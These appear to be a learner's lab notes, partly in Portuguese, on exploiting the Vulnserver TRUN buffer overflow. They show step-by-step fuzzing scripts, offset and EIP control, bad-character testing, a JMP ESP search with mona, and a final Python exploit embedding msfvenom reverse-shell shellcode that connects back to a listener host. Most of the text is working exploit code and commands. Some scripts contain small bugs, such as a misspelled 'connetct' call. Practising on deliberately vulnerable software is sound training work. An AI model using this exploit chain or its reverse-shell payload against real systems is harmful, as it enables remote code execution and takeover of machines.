Windows 10 Server VM - file / Host Network Manager / Host-only network Intel PRO 8254 Permitir VMs
Kali NAT Intel PRO 8254 Permitir tudo

thegreycorner.com/vulnserver.html
immunityinc.com/products/debugger

Defender off

vulnserver.exe as admin
Immunity as admin / file /attach vuln server / play / IP win port 9999

https://medium.com/@lonewolf.raj/easy-steps-to-exploit-windows-based-buffer-overflow-vulnserver-ae9ad4b415b6

https://joncraton.org/blog/46/netcat-for-windows/

nc -nv 192.168.44.100 9999 (netcat) -- Kali

generic_send_tcp

SPIKING:
stats.spk:

s_readline();
s_string("STATS ");
s_string_variable("0");

generic_send_tcp 192.168.44.101 9999 stats.spk 0 0 

not vulnerable

TRUN SPIKING

s_readline();
s_string("TRUN ");
s_string_variable("0");

generic_send_tcp 192.168.44.101 9999 stats.spk 0 0 
send bunch of A's
crash immunity debugger

EBP = 414141 == A A A A (!)
over everything
EIP 414141 -> can inject malicious here

we know TRUN is vulnerable -> FUZZING

fuzz.py
#!/usr/bin/python
import sys, socket
from time import sleep

buffer ="A"*50

while True:
	try:
		s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		s.connect(('192.168.56.101',9999))
		
		s.send(('TRUN /.:/' + buffer))
		sleep(1)
		buffer=buffer + "A"*50
	except:
		print("Fuzzing crashed at %s bytes" % str(len(buffer)))
		sys.exit()
    
chmod +x fuzz.py
./fuzz.py
Fuzzing crashed at 15900 bytes

FIND OFFSET

/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 17000 (>15900) > offset.txt
#!/usr/bin/python
import sys, socket
from time import sleep

buffer ="Aa0Aa1Aa2Aa3Aa4Aa5Aa6"

try:
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(('192.168.56.101',9999))
	
	s.send(('TRUN /.:/' + buffer))
	s.close()
except:
	print("Fuzzing crashed at %s bytes" % str(len(buffer)))
	sys.exit()   
   

└─# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 17000 -q 386F4337
Exact match at offset 2003

control EIP = 4 bytes

OVERWRITE EIP

#!/usr/bin/python
import sys, socket
from time import sleep

buffer="A"*2003+"B"*4

try:
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(('192.168.56.101',9999))
	
	s.send(('TRUN /.:/' + buffer))
	s.close()
except:
	print("Fuzzing crashed at %s bytes" % str(len(buffer)))
	sys.exit()
	
->42424242

unit-conversion.info/texttools/hexadecimal


FIND BAD CHARACTERS -> inutiliza payload

http://www.bulbsecurity.com/finding-bad-characters-with-immunity-debugger-and-mona-py/

#!/usr/bin/python
import sys, socket
from time import sleep

badchars=("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

buffer="A"*2003+"B"*4 + badchars

try:
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(('192.168.56.101',9999))
	
	s.send(('TRUN /.:/' + buffer))
	s.close()
except:
	print("Fuzzing crashed at %s bytes" % str(len(buffer)))
	sys.exit()
	
check Hex Dump <- ESP right click follow in dump

01 02 03 04 ...09, 0A, 0B 0F 10 11  12.. 19 1A

01 02 03 B0 B0 06 07 08 -> B0 bad characters

check each one missing in sequence** <- shellcode

FIND RIGHT MODULE - mona.py

https://github.com/corelan/mona

mona.py to c:\Program Files x86 \ Immunity Inc \ Immunity Debugger \ PyCommands

! mona modules
look for False False False ==  essfunc.dll no memory protection

Kali
locate nasm_shell

/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb

Convert Assembly into hexcode

JMP ESP (pointer)
00000000  FFE4              jmp esp

back Immunity

!mona find -s "\xff\xe4" -m essfunc.dll

Kali
gedit fuzz2.py

#!/usr/bin/python
import sys, socket
from time import sleep

#return address 625011af - pointer in B place EIP, reversed

shellcode="A"*2003+"\xaf\x11\x50\x62"

try:
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(('192.168.56.101',9999))
	
	s.send(('TRUN /.:/' + shellcode))
	s.close()
except:
	print("Fuzzing crashed at %s bytes" % str(len(buffer)))
	sys.exit()
	
Immunity top left:

black arrow - 625011af
find JMP ESP
create breakpoint - hit F2
Play (running)

./fuzz2.py

GETTING ROOT:

msfvenom -p windows/shell_reverse_tcp LHOST=192.168.56.1 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"

CTRL+C CTRL+V

#!/usr/bin/python
import sys, socket

overflow=("\xba\xbe\x88\x85\xda\xd9\xf6\xd9\x74\x24\xf4\x5e\x33\xc9\xb1"
"\x52\x31\x56\x12\x83\xee\xfc\x03\xe8\x86\x67\x2f\xe8\x7f\xe5"
"\xd0\x10\x80\x8a\x59\xf5\xb1\x8a\x3e\x7e\xe1\x3a\x34\xd2\x0e"
"\xb0\x18\xc6\x85\xb4\xb4\xe9\x2e\x72\xe3\xc4\xaf\x2f\xd7\x47"
"\x2c\x32\x04\xa7\x0d\xfd\x59\xa6\x4a\xe0\x90\xfa\x03\x6e\x06"
"\xea\x20\x3a\x9b\x81\x7b\xaa\x9b\x76\xcb\xcd\x8a\x29\x47\x94"
"\x0c\xc8\x84\xac\x04\xd2\xc9\x89\xdf\x69\x39\x65\xde\xbb\x73"
"\x86\x4d\x82\xbb\x75\x8f\xc3\x7c\x66\xfa\x3d\x7f\x1b\xfd\xfa"
"\xfd\xc7\x88\x18\xa5\x8c\x2b\xc4\x57\x40\xad\x8f\x54\x2d\xb9"
"\xd7\x78\xb0\x6e\x6c\x84\x39\x91\xa2\x0c\x79\xb6\x66\x54\xd9"
"\xd7\x3f\x30\x8c\xe8\x5f\x9b\x71\x4d\x14\x36\x65\xfc\x77\x5f"
"\x4a\xcd\x87\x9f\xc4\x46\xf4\xad\x4b\xfd\x92\x9d\x04\xdb\x65"
"\xe1\x3e\x9b\xf9\x1c\xc1\xdc\xd0\xda\x95\x8c\x4a\xca\x95\x46"
"\x8a\xf3\x43\xc8\xda\x5b\x3c\xa9\x8a\x1b\xec\x41\xc0\x93\xd3"
"\x72\xeb\x79\x7c\x18\x16\xea\x43\x75\x20\xeb\x2b\x84\x50\xfa"
"\xf7\x01\xb6\x96\x17\x44\x61\x0f\x81\xcd\xf9\xae\x4e\xd8\x84"
"\xf1\xc5\xef\x79\xbf\x2d\x85\x69\x28\xde\xd0\xd3\xff\xe1\xce"
"\x7b\x63\x73\x95\x7b\xea\x68\x02\x2c\xbb\x5f\x5b\xb8\x51\xf9"
"\xf5\xde\xab\x9f\x3e\x5a\x70\x5c\xc0\x63\xf5\xd8\xe6\x73\xc3"
"\xe1\xa2\x27\x9b\xb7\x7c\x91\x5d\x6e\xcf\x4b\x34\xdd\x99\x1b"
"\xc1\x2d\x1a\x5d\xce\x7b\xec\x81\x7f\xd2\xa9\xbe\xb0\xb2\x3d"
"\xc7\xac\x22\xc1\x12\x75\x42\x20\xb6\x80\xeb\xfd\x53\x29\x76"
"\xfe\x8e\x6e\x8f\x7d\x3a\x0f\x74\x9d\x4f\x0a\x30\x19\xbc\x66"
"\x29\xcc\xc2\xd5\x4a\xc5")

shellcode="A"*2003+"\xaf\x11\x50\x62"+"\x90"*16+overflow    #x90 = pad

try:
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connetct(('192.168.56.101',9999))
	
	s.send(('TRUN /.:/' + shellcode))
	s.close()
except:
	print("Error connecting")
	sys.exit()
	
nc -nvlp 4444

./fuzz2.py
